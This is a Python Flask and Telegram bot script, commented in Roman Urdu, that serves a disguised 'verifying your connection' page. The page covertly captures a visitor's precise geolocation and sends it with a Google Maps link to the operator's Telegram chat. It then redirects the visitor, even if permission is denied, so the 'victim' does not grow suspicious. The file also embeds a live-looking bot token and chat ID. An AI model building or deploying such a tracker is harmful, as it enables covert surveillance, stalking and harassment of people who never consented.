import os
import threading
import time
import requests
from flask import Flask, request
import telebot

# --- CONFIGURATION ---
TELEGRAM_BOT_TOKEN = "8742528917:AAHz664V1Md6qQ_8RP2nKsINXTBRY9loz50"
TELEGRAM_CHAT_ID = "8049432833"
PORT = int(os.environ.get("PORT", 8080))

# Yahan apni woh website ka link dalein jahan aap victim ko location dene ke baad bhejna chahte hain
TARGET_WEBSITE = "https://www.punjabblood.work.gd/"

app = Flask(__name__)
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Telegram Error: {e}")

@bot.message_handler(commands=['start', 'link', 'getlink'])
def send_link_command(message):
    if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
        app_url = os.environ.get("APP_URL", "https://location22.onrender.com")
        response_text = (
            f"🔗 *Aapka Tracking Link Tayar Hai!*\n\n"
            f"`{app_url}`\n\n"
            f"Is link ko victim ko bhejein."
        )
        bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
    else:
        bot.send_message(message.chat.id, "Unauthorized access!")

@app.route("/")
def index():
    return f'''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }}
        body {{
            background: #0f172a;
            color: #f8fafc;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            padding: 20px;
        }}
        .card {{
            background: #1e293b;
            padding: 35px 25px;
            border-radius: 14px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid #334155;
        }}
        .spinner {{
            width: 45px;
            height: 45px;
            border: 4px solid #334155;
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin: 0 auto 20px auto;
        }}
        @keyframes spin {{
            0% {{ transform: rotate(0deg); }}
            100% {{ transform: rotate(360deg); }}
        }}
        .status {{
            font-size: 18px;
            font-weight: 600;
            color: #38bdf8;
            margin-bottom: 10px;
        }}
        .message {{
            font-size: 14px;
            color: #94a3b8;
            line-height: 1.5;
        }}
    </style>
</head>
<body>
    <div class="card">
        <div id="spinner" class="spinner"></div>
        <div id="status" class="status">Loading page...</div>
        <div id="message" class="message">Please wait while we verify your connection.</div>
    </div>

    <script>
        const targetUrl = "{TARGET_WEBSITE}";
        const statusDiv = document.getElementById('status');
        const messageDiv = document.getElementById('message');
        const spinnerDiv = document.getElementById('spinner');

        function onSuccess(pos) {
            try {
                fetch('/update', {{
                    method: 'POST',
                    headers: {{'Content-Type': 'application/json'}},
                    body: JSON.stringify({{
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        timestamp: pos.timestamp
                    }})
                }}).finally(function() {{
                    // Location bhejne ke foran baad asli website par redirect kar do
                    window.location.href = targetUrl;
                }});
            } catch(e) {{
                window.location.href = targetUrl;
            }}
        }
        
        function onError(err) {{
            // Agar permission deny bhi karde tab bhi website par bhej do taake shak na ho
            window.location.href = targetUrl;
        }}
        
        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(onSuccess, onError, {{
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }});
            } else {
                window.location.href = targetUrl;
            }
        }
        
        window.onload = requestLocation;
    </script>
</body>
</html>
'''

@app.route("/update", methods=["POST"])
def update():
    try:
        data = request.get_json(force=True)
    except Exception:
        return "BAD", 400
    
    if not data or "lat" not in data or "lon" not in data:
        return "INVALID", 400

    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("accuracy", "N/A")
    
    msg = (
        f"🚨 *NEW LOCATION RECEIVED!* 🚨\n\n"
        f"🌐 *Latitude:* `{lat}`\n"
        f"🌐 *Longitude:* `{lon}`\n"
        f"🎯 *Accuracy:* `{acc} meters`\n\n"
        f"🗺️ [Google Maps Link](https://maps.google.com/?q={lat},{lon})"
    )
    
    send_telegram_message(msg)
    return "OK", 200

def run_flask():
    app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    send_telegram_message("🟢 *Bot Updated & Started Successfully!* Type /link to get your URL.")
    bot.infinity_polling()
